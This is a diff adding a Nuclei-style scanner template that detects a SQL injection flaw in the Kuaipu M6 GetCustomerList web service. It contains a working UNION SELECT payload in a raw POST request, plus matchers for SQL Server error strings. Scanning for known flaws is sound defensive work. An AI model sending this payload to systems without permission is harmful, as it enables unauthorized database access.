@@ -1,0 +1,27 @@
+id: kuaipuM6-GetCustomerList-sqli
+
+info:
+  name: 快普M6 GetCustomerList SQL注入漏洞
+  author: kuaipuM6
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /WebService/wsAutoComplete.asmx/GetCustomerList HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        prefixText=a'+UNION+ALL+SELECT+@@VERSION,NULL--&count=1&contextKey=a
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '转换成数据类型 int 时失败'
+          - '在将 nvarchar 值'
+        condition: and
+      - type: status
+        status: 
+          - 500
